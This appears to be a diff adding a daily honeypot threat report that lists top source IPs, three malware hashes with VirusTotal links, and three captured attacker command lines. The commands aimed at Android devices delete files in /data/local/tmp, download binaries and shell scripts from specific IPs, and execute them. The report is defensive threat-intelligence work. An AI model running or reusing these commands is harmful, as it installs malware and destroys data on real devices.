@@ -1,0 +1,19 @@
+Top 5 IPs for 2023-12-16:
+47.245.96.218
+61.141.31.3
+184.69.45.218
+58.18.138.69
+110.35.160.241
+
+Malware seen: 
+Hash: 863b22750b132f7756122d3847b9cf47bda53372dcf28c1ed8ad5634eaf59239
+https://www.virustotal.com/gui/file/863b22750b132f7756122d3847b9cf47bda53372dcf28c1ed8ad5634eaf59239
+Hash: 71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+Hash: 26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+
+
+cd /data/local/tmp/; rm *; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7
+cd /data/local/tmp/; busybox wget http://221.132.33.173/ab.sh; sh ab.sh; curl http://221.132.33.173/ac.sh; sh ac.sh; wget http://221.132.33.173/aw.sh; sh aw.sh
+pkill arm7 -9;cd /data/local/tmp/; rm *; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7
